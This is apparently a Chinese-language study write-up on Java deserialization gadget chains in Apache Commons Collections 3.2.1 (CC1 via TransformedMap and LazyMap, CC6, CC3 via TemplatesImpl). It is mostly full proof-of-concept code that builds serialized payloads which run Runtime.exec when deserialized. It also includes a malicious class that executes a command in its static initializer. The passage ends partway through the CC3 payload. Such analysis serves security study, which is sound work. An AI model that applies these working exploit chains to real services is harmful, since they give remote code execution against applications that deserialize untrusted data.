# 写在前面
参考：[https://blog.csdn.net/weixin_45808483/article/details/122743960](https://blog.csdn.net/weixin_45808483/article/details/122743960)
## 配环境：
由于sun的反编译没有具体名字，需要具体找到源码并安装到src里面。
[https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4](https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4)
下载源码，然后找到了路径src/share/classes/sun
直接把整个文件夹赋值，找到对应jdk版本，里面有个src.zip，解压出src，把sun文件夹复制到那里面。
接着在idea里面配置，![微信截图_20230512082333.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1683851020862-93a85672-cee4-47a8-9971-f0f65daa9a75.png#averageHue=%233c4044&clientId=ud4ae357e-769c-4&from=paste&height=498&id=u897d3dc2&originHeight=623&originWidth=1209&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=30160&status=done&style=none&taskId=u2c9113cb-3461-4361-8200-dfcffa576e3&title=&width=967.2)
源路径里面，把src文件夹添加上去。
# CC1
java版本去官网上下7，idea给的8补丁版本太高了。
```java
<dependencies>
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.2.1</version>
        </dependency>
        <!-- 其他依赖项 -->
    </dependencies>
```
在pom.xml上添加这么一段话，用于下载这玩意。
rce方法：
```java
Runtime r = Runtime.getRuntime();
        Class c = Runtime.class;
        Method execMethod = c.getMethod("exec",String.class);
        execMethod.invoke(r,"calc");
    	

```
Runtime无法序列化，于是间接整出：
```java
Class c = Runtime.class;//
Method getruntimeMethod = c.getMethod("getRuntime",null);
Runtime r = getRuntimeMethod.invoke(null,null);//静态方法且无参，两个参数都是null。返回一个runtime对象
Method execMethod = c.getMethod("exec",String.class);
exec.invoke(r,"calc");
```
Runtime一些重要源码
```java
 private static Runtime currentRuntime = new Runtime();

    /**
     * Returns the runtime object associated with the current Java application.
     * Most of the methods of class <code>Runtime</code> are instance
     * methods and must be invoked with respect to the current runtime object.
     *
     * @return  the <code>Runtime</code> object associated with the current
     *          Java application.
     */
    public static Runtime getRuntime() {
        return currentRuntime;
    }

```
## transformer接口
```java
public interface Transformer {
    Object transform(Object var1);
}
```
在idea上按ctrl+h显示当前类或接口的子类型。
![微信截图_20230511103445.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1683772518232-c0718b57-205d-4872-b739-10cf4d26b8f4.png#averageHue=%23524d42&clientId=ua3b2877b-186c-4&from=paste&height=435&id=u2d0c7a40&originHeight=544&originWidth=554&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=51513&status=done&style=none&taskId=uc5b72f21-0ef5-4dc1-9a63-29d65bb5fe6&title=&width=443.2)
## ConstantTransformer
```java
public class ConstantTransformer implements Transformer, Serializable {
    private static final long serialVersionUID = 6374440726369055124L;
    public static final Transformer NULL_INSTANCE = new ConstantTransformer((Object)null);
    private final Object iConstant;

    public static Transformer getInstance(Object constantToReturn) {
        return (Transformer)(constantToReturn == null ? NULL_INSTANCE : new ConstantTransformer(constantToReturn));
    }

    public ConstantTransformer(Object constantToReturn) {
        this.iConstant = constantToReturn;
    }

    public Object transform(Object input) {
        return this.iConstant;
    }

    public Object getConstant() {
        return this.iConstant;
    }
}
```
其中
```java
public Object transform(Object input) {
        return this.iConstant;
    }
public ConstantTransformer(Object constantToReturn) {
        this.iConstant = constantToReturn;
    }
```
`_无论传入什么值，都会返回iConstant值_`，可控。
## ChainedTransformer类
```java
public Object transform(Object object) {
        for(int i = 0; i < this.iTransformers.length; ++i) {
            object = this.iTransformers[i].transform(object);
        }

        return object;
    }
public ChainedTransformer(Transformer[] transformers) {
        this.iTransformers = transformers;
    }
```
_传入数组，循环读取并调用不同类的transformer方法。_
第一次调用以传入的object作为参数，后面则是以前面返回的对象作为参数反复调用，形成链式调用。
## InvokeTransformer
```java
Class cls = input.getClass();
                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
                return method.invoke(input, this.iArgs);
public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        this.iMethodName = methodName;
        this.iParamTypes = paramTypes;
        this.iArgs = args;
    }
```
_通过反射，获取类，调用方法，均可控。_
## 一步步测试
```java
import org.apache.commons.collections.functors.InvokerTransformer;
public class Demo1 {
    public static void main(String[] args) throws Exception{
        Runtime runtime = Runtime.getRuntime();
        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(runtime);
    }
}
```
```java
public Process exec(String command, String[] envp) throws IOException {
        return exec(command, envp, null);
    }
```
Runtime.getRuntime() 是 Java 中的一个静态方法，它返回一个代表当前应用程序运行时环境的 Runtime 对象。
构造函数，第一个传入方法名，第二个传入要反射方法的参数类型原型，很显然要传入String原型。第三个要传入执行的命令，由于构造函数规定了参数类型，所以调用的时候也要写相应的类型。
最后transform调用，传入runtime对象，实现命令执行。
这就是通过Invoketransformer进行rce。
## transformedmap
这里主要是寻找不名为transform的方法调用transform方法。
寻找transoformedmap类
```java
protected Object checkSetValue(Object value) {
        return this.valueTransformer.transform(value);
    }
protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {
        super(map);
        this.keyTransformer = keyTransformer;
        this.valueTransformer = valueTransformer;
    }
```
构造方法有个封装，找到入口
```java
public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
        return new TransformedMap(map, keyTransformer, valueTransformer);
    }
```
## AbstractInputCheckedMapDecorator类
```java
public Object setValue(Object value) {
            value = this.parent.checkSetValue(value);
            return this.entry.setValue(value);
        }
    }
```
由于调用构造函数的时候会一直调用父类构造方法。这是transformedmap的父类，其父类是
## demo2
```java
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.util.HashMap;
import java.util.Map;
public class Demo2 { public static void main(String[] args) throws Exception {

    Runtime runtime = Runtime.getRuntime();
    InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});

    // 以下步骤就相当于 invokerTransformer.transform(runtime);
    HashMap<Object, Object> map = new HashMap<>();
    map.put("key","value");

    Map<Object,Object> transformedMap = TransformedMap.decorate(map, null, invokerTransformer);

    // 遍历Map——checkSetValue(Object value)只处理了value,所以我们只需要将runtime传入value即可
    for (Map.Entry entry:transformedMap.entrySet()){
        entry.setValue(runtime);
    }

}
}
```
跟着调试。目的：通过InvokerTransformer的transform方法调用我们创造InvokerTransformer，实现rce。
跟进transformedMap的创建过程。
```java
public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
        return new TransformedMap(map, keyTransformer, valueTransformer);
    }
```
这里map是我们建的空map，valuetransformer是我们传入的恶意invokeTransformer对象。
然后调用transformedMap的构造方法。
```java
protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {
        super(map);
        this.keyTransformer = keyTransformer;
        this.valueTransformer = valueTransformer;
    }
```
valueTransformer成功赋上恶意对象。
父类构造方法
```java
public AbstractMapDecorator(Map map) {
        if (map == null) {
            throw new IllegalArgumentException("Map must not be null");
        } else {
            this.map = map;
        }
    }
```
这步走完。
跟进entry.set():
```java
public Set entrySet() {
        return (Set)(this.isSetValueChecking() ? new EntrySet(this.map.entrySet(), this) : this.map.entrySet());
    }

```
这里执行true的操作。
```java
protected EntrySet(Set set, AbstractInputCheckedMapDecorator parent) {
            super(set);
            this.parent = parent;
        }
```
set就是hashmap对象，parent就是transformedmap对象。
然后进行迭代，由于transformed父类覆写iterator方法，看一下：
```java
public Iterator iterator() {
            return new EntrySetIterator(this.collection.iterator(), this.parent);
        }
```
这里返回的是迭代对象AbstractInputCheckedMapDecorator，调用其setvalue方法，
```java
public Object setValue(Object value) {
            value = this.parent.checkSetValue(value);
            return this.entry.setValue(value);
        }
    }
```
一步步走下去，就和之前分析的一样。
![](https://cdn.nlark.com/yuque/0/2023/jpeg/34502958/1683805342929-ffc4ec8e-2b7a-446d-99f5-e39d6474d7ca.jpeg)
最后通过迭代，调用entrySet:constructor的方法。
继续寻找能调用setValue的方法
## AnnotationInvocationHandler 
readobject方法
```java
private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
        s.defaultReadObject();

        // Check to make sure that types have not evolved incompatibly

        AnnotationType annotationType = null;
        try {
            annotationType = AnnotationType.getInstance(type);
        } catch(IllegalArgumentException e) {
            // Class is no longer an annotation type; time to punch out
            throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");
        }

        Map<String, Class<?>> memberTypes = annotationType.memberTypes();

        // If there are annotation members without values, that
        // situation is handled by the invoke method.
        for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
            String name = memberValue.getKey();
            Class<?> memberType = memberTypes.get(name);
            if (memberType != null) {  // i.e. member still exists
                Object value = memberValue.getValue();
                if (!(memberType.isInstance(value) ||
                      value instanceof ExceptionProxy)) {
                    memberValue.setValue(
                        new AnnotationTypeMismatchExceptionProxy(
                            value.getClass() + "[" + value + "]").setMember(
                                annotationType.members().get(name)));
                }
            }
        }
    }
}
```
有对map的遍历，有setvalue。
```java
package Enterprise.cc;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.annotation.Target;
import java.lang.annotation.RetentionPolicy;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;
import java.lang.reflect.Method;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
public class Demo3 {
    public static Object generatePayload() throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),//返回我们的类
                new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class }, new Object[] { "calc" })
        };               //这里和我上面说的有一点点不同,因为Runtime.getRuntime()没有实现Serializable接⼝,所以这里用的Runtime.class。class类实现了serializable接⼝

        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innermap = new HashMap();
        innermap.put("value", "xxx");
        Map outmap = TransformedMap.decorate(innermap, null, transformerChain);
        //通过反射获得AnnotationInvocationHandler类对象
        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        //通过反射获得cls的构造函数
        Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);
        //这里需要设置Accessible为true，否则序列化失败
        ctor.setAccessible(true);
        //通过newInstance()方法实例化对象
        Object instance = ctor.newInstance(Retention.class, outmap);
        return instance;
    }

    public static void main(String[] args) throws Exception {
        payload2File(generatePayload(),"obj");
        payloadTest("obj");
    }
    public static void payload2File(Object instance, String file)
            throws Exception {
        //将构造好的payload序列化后写入文件中
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(file));
        out.writeObject(instance);
        out.flush();
        out.close();
    }
    public static void payloadTest(String file) throws Exception {
        //读取写入的payload，并进行反序列化
        ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
        in.readObject();
        in.close();
    }
}
```
反向调试一下，跟着反序列化过程走。
readObject下断点：
首先清楚一点：序列化的对象是反射的AnnotationInvocationHandler。
看看AnnotationInvocationHandler的readObject方法。
```java
private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
        s.defaultReadObject();

        // Check to make sure that types have not evolved incompatibly

        AnnotationType annotationType = null;
        try {
            annotationType = AnnotationType.getInstance(type);
        } catch(IllegalArgumentException e) {
            // Class is no longer an annotation type; time to punch out
            throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");
        }

        Map<String, Class<?>> memberTypes = annotationType.memberTypes();

        // If there are annotation members without values, that
        // situation is handled by the invoke method.
        for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
            String name = memberValue.getKey();
            Class<?> memberType = memberTypes.get(name);
            if (memberType != null) {  // i.e. member still exists
                Object value = memberValue.getValue();
                if (!(memberType.isInstance(value) ||
                      value instanceof ExceptionProxy)) {
                    memberValue.setValue(
                        new AnnotationTypeMismatchExceptionProxy(
                            value.getClass() + "[" + value + "]").setMember(
                                annotationType.members().get(name)));
                }
            }
        }
    }
}
```
会调用默认的方法。重点看循环，会被memberValues的entrySet赋值对象
看一下代码
```java
return (Set)(this.isSetValueChecking() ? new EntrySet(this.map.entrySet(), this) : this.map.entrySet());
```
返回一个entrySet的类，由于这个类是定义在AbstractInputCheckedMapDecorator内部的类，那么最终其实返回的是AbstractInputCheckedMapDecorator对象。
调用setvalue实际上就是调用AbstractInputCheckedMapDecorator的这个方法，
然后调用transformedmap的checkvalue方法
```java
public Object setValue(Object value) {
            value = this.parent.checkSetValue(value);
            return this.entry.setValue(value);
        }
    }
```
调用ChainedTransformer的这个方法
```java
protected Object checkSetValue(Object value) {
        return this.valueTransformer.transform(value);
    }
```
跟进
```java
public Object transform(Object object) {
        for(int i = 0; i < this.iTransformers.length; ++i) {
            object = this.iTransformers[i].transform(object);
        }

        return object;
    }
```
进行一个链式调用。
```java
new ConstantTransformer(Runtime.class),//返回我们的类
                new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class }, new Object[] { "calc" })
        };
```
第一个，无论传进来什么类，都会要给定义好的值。
```java
public Object transform(Object input) {
        return this.iConstant;
    }
```
这里设置的时候，传的是Runtime.class类。
然后进invoketransformer方法，进行反射。
```java
Class cls = input.getClass();
                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
                return method.invoke(input, this.iArgs);
```
input是Runtime.class反射，iMethodName是‘getmethod',iParamTypes是传入参数的类型，指定了getmethod的两个参数，前一个是string，后面一个要传给string所指方法的参数类型，这里是均为Class的对象。
于是获取了方法为“getmethod”的getmethod对象，然后调用getmethod作用于runtime的原型类，并传入getruntime作为参数，相当于反射的对象runtime调用getmethod获取runtime方法。
## 实现
方法调用公式（虽然这么叫不太好）：
```java
第一步：
方法名所属对象获取对象原型，即xxx.class
第二步：
对对象原型使用getMethod("方法名",参数的原型Class);//多个参数就都号分开写，null就new Object[]{null}
第三步：
对getMethod获取的对象使用invoke("方法名所属对象","参数")
```
按照这个公式
```java
Class cls = input.getClass();
                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
                return method.invoke(input, this.iArgs);
```
第一行对应第一步，第二行对应第二步，第三行对应第三步。
然后分析参数，input是我们要给的对象，直接就Runtime.class.
iMethodName是要调用的方法,为构造函数的第一个参数，iParamTypes为第二个参数，表示传参类型的class。
iArgs为第三个参数，表示要传进的参数。
可以通过反射获取反射方法，实现反射方法。
根据此，构造如下payload：
```java
new InvokeTransforemer("getMethod",new class[]{String,class,class[].class},new Object("getRuntime",null));
new InvokeTransforemer("invoke",new class[]{object.class,object[].class},new Object[]{null,null});
new InvokeTransforemer("exec",new class[]{String.class},new Object[]{"calc"};
```
由于getmethod传参需要传入设置原型，多个参数的时候，一般都用 new Class[],表示为类的数组。
创建的时候就可以用Object实例化。
空参数的class原型是new Class[0]
获得getMethod的参数原型，是实际方法参数原型的原型，比如实际的原型是object.class,那么getMethod的原型就要向上访问一级，即class.class,注意一下getmethod的第二个参数。

```java
Class c = Runtime.class;
        Method getRuntimeMethod  = c.getMethod("getRuntime",null);//null的原型是空类数组原型
        Runtime r = (Runtime) getRuntimeMethod.invoke(null,null);//第一个是空对象，第二个是空字符串
        Method execMethod = c.getMethod("exec",String.class);
        execMethod.invoke(r,"calc");
```
```java
new InvokerTransformer("getMethod",new class[]{String.class,class[].class},new object[]{null}).transfor(rumtime.class);
```
## 流程图
![](https://cdn.nlark.com/yuque/0/2023/jpeg/34502958/1683938236647-080036a2-d2ba-429b-b9b5-b8c4e7395e2a.jpeg)

# lazymap
## poc
```java
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

public class CommonCollections12 {
    public static Object generatePayload() throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class }, new Object[] { "calc" })
        };
        Transformer transformerChain = new ChainedTransformer(transformers);

        Map innermap = new HashMap();
        innermap.put("value", "xxx");
        Map outmap = LazyMap.decorate(innermap,transformerChain);
        //通过反射获得AnnotationInvocationHandler类对象
        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        //通过反射获得cls的构造函数
        Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);
        //这里需要设置Accessible为true，否则序列化失败
        ctor.setAccessible(true);
        //通过newInstance()方法实例化对象
        InvocationHandler handler = (InvocationHandler)ctor.newInstance(Retention.class, outmap);
        Map mapProxy = (Map)Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(),handler);
        Object instance = ctor.newInstance(Retention.class, mapProxy);

        return instance;
    }
    public static void main(String[] args) throws Exception {
        payload2File(generatePayload(),"obj");
        payloadTest("obj");
    }
    public static void payload2File(Object instance, String file)
            throws Exception {
        //将构造好的payload序列化后写入文件中
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(file));
        out.writeObject(instance);
        out.flush();
        out.close();
    }
    public static void payloadTest(String file) throws Exception {
        //读取写入的payload，并进行反序列化
        ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
        in.readObject();
        in.close();
    }
}
```
## AnnotationInvocationHandler
```java
Map.Entry<String, Object> memberValue : memberValues.entrySet()
```

触发invoke：
动态代理：动态代理是在运行时动态生成代理类的一种机制，无需手动编写代理类。Java 提供了 java.lang.reflect 包中的 Proxy 类和 InvocationHandler 接口来支持动态代理。通过 Proxy.newProxyInstance 方法创建代理对象，并传入实现了 InvocationHandler 接口的调用处理器。调用处理器中的 invoke 方法会在代理对象的方法调用时被触发
代理的是lazymap，处理器接口时AnnotationInvocationHandler，在调用handler时，this会指向AnnotationInvocationHandler实例，调用方法自动触发invoke。
```java
Object result = memberValues.get(member);
```
get方法
```java
public Object get(Object key) {
        if (!this.map.containsKey(key)) {
            Object value = this.factory.transform(key);
            this.map.put(key, value);
            return value;
        } else {
            return this.map.get(key);
        }
    }
}
```
然后transform触发之前的链子。
## 流程图
![](https://cdn.nlark.com/yuque/0/2023/jpeg/34502958/1684046803938-bc673f60-bf25-44b0-86ec-d1f5aeedf942.jpeg)
# cc6
## poc
```java
package Enterprise.cc;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class cc6 {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Class.forName("java.lang.Runtime")),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class,Class[].class},
                        new Object[]{"getRuntime",new Class[0]}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class,Object[].class},
                        new Object[]{null,new Object[0]}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"calc"}
                )
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap,chainedTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap,"feng1");
        Map hashMap = new HashMap();

        hashMap.put(tiedMapEntry,"feng2");
        byte[] bytes = serialize(hashMap);
        //unserialize(bytes);
    }
    public static void unserialize(byte[] bytes) throws Exception{
        try(ByteArrayInputStream bain = new ByteArrayInputStream(bytes);
            ObjectInputStream oin = new ObjectInputStream(bain)){
            oin.readObject();
        }
    }

    public static byte[] serialize(Object o) throws Exception{
        try(ByteArrayOutputStream baout = new ByteArrayOutputStream();
            ObjectOutputStream oout = new ObjectOutputStream(baout)){
            oout.writeObject(o);
            return baout.toByteArray();
        }
    }
}



```
先简单说一下调用链：
## hashmap
```java
 public V put(K key, V value) {
        return putVal(hash(key), key, value, false, true);
    }
```
```java
static final int hash(Object key) {
        int h;
        return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
    }
```
## tiedmapentry
```java
public int hashCode() {
        Object value = this.getValue();
        return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode());
    }
```
```java
public Object getValue() {
        return this.map.get(this.key);
    }
```
## lazymap
```java
public Object get(Object key) {
        if (!this.map.containsKey(key)) {
            Object value = this.factory.transform(key);
            this.map.put(key, value);
            return value;
        } else {
            return this.map.get(key);
        }
    }
}
```
不解释了。


链子解释完了，现在问题，就是在之前调用put的时候就会触发这个链子，为此需要优化一下。
```java
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package org.apache.commons.collections.map;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.Map;
import org.apache.commons.collections.Factory;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.FactoryTransformer;

public class LazyMap extends AbstractMapDecorator implements Map, Serializable {
    private static final long serialVersionUID = 7990956402564206740L;
    protected final Transformer factory;

    public static Map decorate(Map map, Factory factory) {
        return new LazyMap(map, factory);
    }

    public static Map decorate(Map map, Transformer factory) {
        return new LazyMap(map, factory);
    }

    protected LazyMap(Map map, Factory factory) {
        super(map);
        if (factory == null) {
            throw new IllegalArgumentException("Factory must not be null");
        } else {
            this.factory = FactoryTransformer.getInstance(factory);
        }
    }

    protected LazyMap(Map map, Transformer factory) {
        super(map);
        if (factory == null) {
            throw new IllegalArgumentException("Factory must not be null");
        } else {
            this.factory = factory;
        }
    }

    private void writeObject(ObjectOutputStream out) throws IOException {
        out.defaultWriteObject();
        out.writeObject(this.map);
    }

    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        this.map = (Map)in.readObject();
    }

    public Object get(Object key) {
        if (!this.map.containsKey(key)) {
            Object value = this.factory.transform(key);
            this.map.put(key, value);
            return value;
        } else {
            return this.map.get(key);
        }
    }
}

```
put调用之前，改一下链子，让其不执行。
之后在序列化之前再利用反射改变一下。
但是之后就反序列化不成功。
原因在于：
```java
public Object get(Object key) {
        if (!this.map.containsKey(key)) {
            Object value = this.factory.transform(key);
            this.map.put(key, value);
            return value;
        } else {
            return this.map.get(key);
        }
    }
}
```
有个判断，由于第一次没有值，就会放进去，之后再调用就不会进入这个if语句。
想办法在put之后，把key值删了。
最终
```java
package Enterprise.cc;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantFactory;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class cc6 {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Class.forName("java.lang.Runtime")),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class,Class[].class},
                        new Object[]{"getRuntime",new Class[0]}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class,Object[].class},
                        new Object[]{null,new Object[0]}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"calc"}
                )
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap,new ConstantTransformer(1));

        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap,"feng1");
        Map hashMap = new HashMap();

        hashMap.put(tiedMapEntry,"feng2");
        outerMap.remove("feng1");
        Class c = LazyMap.class;
        Field factoryfield = c.getDeclaredField("factory");
        factoryfield.setAccessible(true);
        factoryfield.set(outerMap,chainedTransformer);

        byte[] bytes = serialize(hashMap);
        unserialize(bytes);
    }
    public static void unserialize(byte[] bytes) throws Exception{
        try(ByteArrayInputStream bain = new ByteArrayInputStream(bytes);
            ObjectInputStream oin = new ObjectInputStream(bain)){
            oin.readObject();
        }
    }

    public static byte[] serialize(Object o) throws Exception{
        try(ByteArrayOutputStream baout = new ByteArrayOutputStream();
            ObjectOutputStream oout = new ObjectOutputStream(baout)){
            oout.writeObject(o);
            return baout.toByteArray();
        }
    }
}



```

# cc3
```java
TemplatesImpl templates = new TemplatesImpl();
        Class tc = templates.getClass();
        Field namefiled = tc.getDeclaredField("_name");
        namefiled.setAccessible(true);
        namefiled.set(templates,"114514");
        Field bycodesfiled = tc.getDeclaredField("_bytecodes");
        bycodesfiled.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("D://tmp/classes/Test.class"));

        byte[][] codes = {code};
        bycodesfiled.set(templates,codes);
        Field tfactoryfield = tc.getDeclaredField("_tfactory");
        tfactoryfield.setAccessible(true);
        tfactoryfield.set(templates,new TransformerFactoryImpl());
        templates.newTransformer();
```
test.class
```java
package Enterprise.cc;

import java.io.IOException;

public class Test {
    public Test() {
    }

    static {
        try {
            Runtime.getRuntime().exec("cals");
        } catch (IOException var1) {
            var1.printStackTrace();
        }

    }
}
```
这里通过加载文件类实现恶意方法。
## 空指针error
报了个空指针错误：
具体原因：
```java
if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
                    _transletIndex = i;
                }
                else {
                    _auxClasses.put(_class[i].getName(), _class[i]);
                }
            }
if (_transletIndex < 0) {
                ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);
                throw new TransformerConfigurationException(err.toString());
            }
        }
```
这里进了else语句：
auxClasses为空，但是后面又对transletIndex有要求，
所以这里要进if语句，就对类的父类进行要求，找到父类
```java
private static String ABSTRACT_TRANSLET
        = "com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
```
所以要继承这个类。
修改一下test.class
```java
package Enterprise.cc;
import java.io.IOException;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class Test  extends  AbstractTranslet{
   static {
       try{
           Runtime.getRuntime().exec("calc");
       } catch(IOException e){
           e.printStackTrace();

       }}

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}

```
由于是个抽象类，要实现抽象方法，选取AbstractTranslet，按alt+enter,点击实现方法，确认。即可快速实现。
成功执行，弹计算机。
## 找链子
现在就是要寻找能调用templates.transformer的地方。
这里借用cc1的payload：
```java
Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(templates),
                new InvokerTransformer("newTransformer",null,null)

        };
```
这里直接就是传入的参数就是null了，也不需要获取null的原型了。不是获得方法时由于参数是null，要得到原型。null相当于new Class[0] 或new Object[0].
后半段就和cc1中的方法一样。
## 完整payload
```java
package Enterprise.cc;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantFactory;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.nio.file.Files;
import java.util.HashMap;
import java.util.Map;
import java.nio.file.Paths;


public class cc3 {
    public static void payload2File(Object instance, String file)
            throws Exception {
        //将构造好的payload序列化后写入文件中
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(file));
        out.writeObject(instance);
        out.flush();
        out.close();
    }

    public static void payloadTest(String file) throws Exception {
        //读取写入的payload，并进行反序列化
        ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
        in.readObject();
        in.close();
    }
    public static void main(String[] args) throws Exception{
        TemplatesImpl templates = new TemplatesImpl();
        Class tc = templates.getClass();
        Field namefiled = tc.getDeclaredField("_name");
